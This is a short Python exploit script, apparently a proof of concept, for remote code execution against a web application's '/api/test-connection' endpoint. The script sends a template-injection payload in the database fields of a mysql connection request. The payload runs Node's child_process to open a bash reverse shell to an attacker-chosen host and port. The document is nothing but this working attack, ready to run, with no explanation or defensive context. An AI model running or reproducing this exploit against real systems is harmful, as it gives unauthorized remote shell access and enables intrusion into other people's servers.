import requests
import sys
    
if len(sys.argv) < 4:
    print("Usage: python3 rce.py URL LHOST LPORT")
    sys.exit(1)
base_url = sys.argv[1]
url = sys.argv[1].rstrip("/") + "/api/test-connection"
#print(url)

headers = {"Content-Type": "application/json",
           "Accept": "application/json"}
payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{sys.argv[2]}/{sys.argv[3]} 0>&1\"') }}}}"
data = {"name":"test",
        "driver":"mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

try:
    response = requests.post(url, headers=headers, json=data)
    print(response.text)
except Exception as e:
    print(f"Error {e}")
